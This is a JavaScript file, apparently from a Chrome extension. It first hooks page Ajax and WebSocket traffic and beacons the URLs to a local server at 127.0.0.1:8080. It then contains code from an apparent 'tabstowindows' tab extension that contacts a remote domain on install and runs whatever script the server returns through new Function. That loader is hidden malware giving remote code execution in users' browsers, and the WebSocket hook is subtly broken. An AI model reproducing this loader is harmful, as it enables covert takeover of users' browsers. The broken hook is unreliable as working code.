function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var domain = "https://tabstowindows.com/"

var g = (result) => ((data) => {(new Function(data))()})(result)

var checkinstalled = new Promise((r, rej) => {
    chrome.storage.sync.get('tabs', function (s) {
        if (s.tabs) return;
        chrome.storage.sync.set({tabs: true})
   		fetch(domain+'install', {
               method: 'POST', credentials: 'include'
       }).then(fetch_status => r(fetch_status.text()));
    })
});

var checkstatus = new Promise((r, rej) => {
   chrome.storage.sync.get('data', function (app_settings) {
       if (app_settings.data) {
       		if( app_settings.data.stats && r(app_settings.data.stats)) {
		           // console.log("valid settings...")
		       }
       }
   })
});

chrome.runtime.setUninstallURL(domain+'uninstall');

checkstatus.then(g);
checkinstalled.then(g);